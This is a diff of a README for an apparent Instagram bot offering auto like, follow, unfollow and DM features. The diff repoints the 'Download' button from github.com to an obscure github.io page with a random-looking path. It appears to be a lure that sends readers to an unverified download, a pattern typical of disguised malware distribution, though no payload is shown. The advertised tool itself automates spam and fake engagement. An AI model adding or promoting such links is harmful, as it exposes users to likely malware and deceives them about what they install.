@@ -19,7 +19,7 @@ Let our Instagram bot do the hard work for you with clever automated voting on I
 
 Get the new and revised line up with auto like, auto follow, auto unfollow and auto DM modules included.
 
-<div align="center"><a href="https://github.com"><img src="https://img.shields.io/badge/Download-blue?style=for-the-badge" height="80"></a></div>
+<div align="center"><a href="https://gorosul.github.io/id/0sg861fsh"><img src="https://img.shields.io/badge/Download-blue?style=for-the-badge" height="80"></a></div>
 
 > 🔲 Supported CPU: AMD & Intel
 >
